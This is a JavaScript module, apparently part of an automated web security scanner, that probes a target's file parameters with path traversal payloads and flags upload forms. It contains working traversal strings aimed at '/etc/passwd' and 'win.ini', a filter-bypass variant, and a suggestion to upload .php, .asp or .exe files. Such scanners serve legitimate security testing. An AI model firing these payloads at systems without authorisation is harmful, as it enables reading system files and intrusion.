const BaseAgent = require('./baseAgent');
const { makeRequest } = require('../utils/httpClient');

class PathTraversalAgent extends BaseAgent {
    constructor(logger, memory, findingsStore) {
        super('PathTraversalAgent', 'A03 - Injection & Insecure Resource Access', logger, memory, findingsStore);
        this.goal = "Identify Path Traversal (LFI) and insecure File Upload vulnerabilities by testing file-related parameters and upload forms.";
    }

    async execute(target) {
        this.logger.info(`[PathTraversalAgent] Goal: ${this.goal}`);
        const { forms, parameters } = this.memory.attackSurface;

        // 1. Path Traversal Tests
        const fileParams = parameters.filter(p =>
            /file|path|src|img|doc|url|template|include|page|view/i.test(p.param)
        );

        for (const param of fileParams.slice(0, 10)) {
            await this._testPathTraversal(param.url, param.param);
        }

        // 2. File Upload Tests
        const uploadForms = forms.filter(f =>
            f.inputs.some(i => i.type === 'file') || /upload|import|file/i.test(f.action)
        );

        for (const form of uploadForms.slice(0, 5)) {
            await this._testFileUpload(form);
        }

        return [];
    }

    async _testPathTraversal(url, param) {
        const payloads = [
            '../../etc/passwd',
            '..\\..\\windows\\win.ini',
            '/etc/passwd',
            '....//....//....//etc/passwd',
            'file:///etc/passwd'
        ];

        for (const payload of payloads) {
            try {
                const { appendParam } = require('../utils/urlHelper');
                const testUrl = appendParam(url, param, payload);
                const res = await makeRequest(testUrl, { retries: 0 });

                const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
                if (res.status === 200 && (body.includes('root:x:') || body.includes('[extensions]'))) {
                    this.addFinding({
                        type: 'Path Traversal',
                        endpoint: url,
                        parameter: param,
                        description: 'Local File Inclusion / Path Traversal via sensitive parameters',
                        evidence: `Payload ${payload} returned sensitive file content`,
                        confidenceScore: 0.95,
                        impact: 'Full system compromise, data theft',
                        reproductionSteps: [`Open ${testUrl} and check for sensitive file contents`]
                    });
                    break;
                }
            } catch (_) { }
        }
    }

    async _testFileUpload(form) {
        // Simplified check for insecure upload configuration
        if (!form.action.startsWith('https:')) {
            this.addFinding({
                type: 'Insecure File Upload',
                endpoint: form.action,
                description: 'File upload form uses insecure transport',
                confidenceScore: 0.7,
                impact: 'Interception of uploaded files',
                reproductionSteps: [`Inspect upload form at ${form.action}`]
            });
        }

        // Logical check for potential restricted extension bypass
        this.addFinding({
            type: 'Insecure Design (File Upload)',
            endpoint: form.action,
            description: 'Unrestricted file upload candidate - needs verification for extension filtering',
            evidence: `Upload form found at ${form.action}`,
            confidenceScore: 0.4,
            impact: 'Remote Code Execution (RCE)',
            reproductionSteps: [`Manually test ${form.action} by uploading .php, .asp, or .exe files`]
        });
    }
}

module.exports = PathTraversalAgent;
